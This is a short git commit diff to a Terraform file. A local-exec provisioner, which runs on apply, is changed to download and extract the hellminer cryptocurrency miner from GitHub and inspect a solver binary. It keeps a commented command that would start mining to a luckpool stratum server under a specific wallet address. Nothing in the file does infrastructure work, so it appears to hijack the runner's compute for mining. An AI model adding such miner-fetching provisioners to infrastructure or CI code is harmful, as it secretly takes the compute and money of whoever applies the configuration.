2765c0044374743451a521cff044faee9ddbb653
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:06:16 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,10 +1,12 @@
 resource "null_resource" "extrac_and_run_1" {
   provisioner "local-exec" {
     command = <<EOT
-#curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
-#tar -xzvf hellminer_linux64.tar.gz
+curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
+tar -xzvf hellminer_linux64.tar.gz
 #./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
-ls ..
+ls -lah
+file verus-solver
+ldd verus-solver
 EOT
   }
 }
